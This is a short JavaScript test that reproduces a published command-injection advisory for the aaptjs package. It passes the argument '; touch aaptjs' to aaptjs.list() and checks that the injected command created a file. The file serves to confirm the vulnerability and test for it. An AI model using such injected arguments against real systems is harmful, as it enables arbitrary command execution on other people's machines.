//https://github.com/advisories/GHSA-4g7x-7vgq-3j28
test("Remote code execution in aaptjs", (done) => {
  const aaptjs = require("aaptjs");
  const fs = require("fs");
  const path = "./aaptjs";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    aaptjs.list("; touch aaptjs", (err, data) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
